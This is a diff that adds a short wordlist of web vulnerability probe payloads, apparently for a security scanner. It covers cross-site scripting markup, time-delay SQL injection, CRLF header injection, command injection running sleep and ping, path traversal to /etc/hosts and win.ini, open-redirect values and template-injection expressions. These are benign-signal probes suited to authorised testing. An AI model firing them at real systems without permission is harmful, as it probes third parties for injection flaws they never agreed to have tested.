@@ -1,0 +1,27 @@
+KILLERQUEEN
+'"><KILLERQUEEN>
+'>"><script>alert("KILLERQUEEN")</script>
+'
+"
+-SELECT SLEEP(10)
+'-SELECT SLEEP(10)
+; WAIT FOR DELAY '00:00:10'
+' WAIT FOR DELAY '00:00:10
+%0d%0aSet-Cookie:xxxxtest%3Dxxxxtest%3B
+../../../../../../../bin/sleep 20|
+;/bin/sleep 20
+../../../../../../../windows/system32/ping -n 21 127.0.0.1|
+&/windows/system32/ping -n 21 127.0.0.1
+../../../../../../../../../etc/hosts
+../../../../../../../../../etc/hosts%00
+../../../../../../../../../windows/win.ini
+../../../../../../../../../windows/win.ini%00
+https://www.www.example.com/
+//www.example.com/
+@www.example.com/
+{{16*16*16}}
+${16*16*16}
+${{16*16*16}}
+#{16*16*16}
+<%25= 16*16*16 %25>
+<%25 out.println("KILLERQUEEN"); %25>
